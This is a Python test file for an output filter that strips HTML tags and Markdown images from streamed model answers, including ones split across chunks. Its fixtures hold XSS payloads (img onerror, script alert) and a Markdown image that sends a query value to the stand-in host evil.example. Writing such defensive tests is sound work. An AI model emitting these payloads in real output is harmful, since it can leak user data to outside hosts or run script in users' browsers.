"""OutputGuard: HTML and Markdown images never leave the server, even split in pieces."""

import pytest

from app.modules.knowledge.domain.output_guard import OutputGuard


def run(*pieces: str) -> tuple[str, OutputGuard]:
    guard = OutputGuard()
    shown = "".join(guard.feed(p) for p in pieces) + guard.finish()
    return shown, guard


def test_plain_text_goes_out_at_once() -> None:
    guard = OutputGuard()
    assert guard.feed("El plazo es de 30 días [1].") == "El plazo es de 30 días [1]."


@pytest.mark.parametrize(
    "pieces",
    [
        ('Cada 90 días [1]. <img src="https://evil.example/x.png" onerror="alert(1)">',),
        ("Cada 90 días [1]. <im", 'g src="https://evil.', 'example/x.png" onerror="alert(1)">'),
        ("Cada 90 días [1]. <script>alert(1)</script>",),
        (
            "Cada 90 días [1]. <",
            "script>alert(1)<",
            "/script>",
        ),
    ],
)
def test_html_tags_are_removed_even_when_split(pieces: tuple[str, ...]) -> None:
    shown, guard = run(*pieces)
    assert "<" not in shown
    assert "evil.example" not in shown
    assert "onerror" not in shown
    assert shown.startswith("Cada 90 días [1].")
    assert guard.removed


def test_markdown_images_are_removed_even_when_split() -> None:
    shown, guard = run("Una notebook [1]. ![lo", "go](https://evil.example/log?q=", "hola) Fin.")
    assert shown == "Una notebook [1].  Fin."
    assert guard.removed == ["![logo](https://evil.example/log?q=hola)"]


def test_a_less_than_sign_in_text_is_kept() -> None:
    shown, _ = run("Si el monto es < 100", " pesos, no aplica.")
    assert shown == "Si el monto es < 100 pesos, no aplica."


def test_links_and_exclamations_stay_as_text() -> None:
    shown, _ = run("¡Ojo! Ver www.argentina.gob.ar [1]", "!")
    assert shown == "¡Ojo! Ver www.argentina.gob.ar [1]!"


def test_a_tag_that_never_closes_is_released_as_text() -> None:
    shown, _ = run("<b", " " + "x" * 500)
    assert shown.startswith("<b x")
